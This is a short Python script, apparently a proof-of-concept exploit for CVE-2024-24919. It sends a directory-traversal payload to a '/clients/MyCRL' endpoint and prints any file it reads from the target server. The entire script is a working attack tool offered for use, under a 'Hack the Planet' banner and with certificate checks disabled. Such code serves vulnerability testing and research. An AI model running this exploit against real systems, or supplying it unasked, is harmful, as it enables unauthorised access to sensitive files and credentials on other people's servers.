import requests
import argparse
import sys

import urllib3

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))

def ascii():
    art = print("""   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
""")
    return art 
    
def exploit(targetUrl, targetFile):
    
    finalUrl = f"{targetUrl}/clients/MyCRL"
    
    data = f"aCSHELL/../../../../../../../../../../../../../../../../..{targetFile}"
    
    # Make the POST request
    response = requests.post(finalUrl, data=data, verify=False)

    # Check if the request was successful
    if response.status_code == 200:
        print("Request was successful!!!! \n")
        print("Response content: \n")
        print(response.text)
    
    else:
        print("Target might not be vulnerable...")
        sys.exit("Exiting..")


def main():
    parser = argparse.ArgumentParser(description="CVE-2024-24919")
    parser.add_argument("-u", '--targetUrl', required=True, help="The target URL")
    parser.add_argument("-f", '--targetFile', required=True, help="The target file to read")
    args = parser.parse_args()
    try:
        ascii()
        return(exploit(args.targetUrl, args.targetFile))
            
    except Exception as e:
        sys.exit(f"Some error occured: {e}")
        
if __name__ == "__main__":
    main()
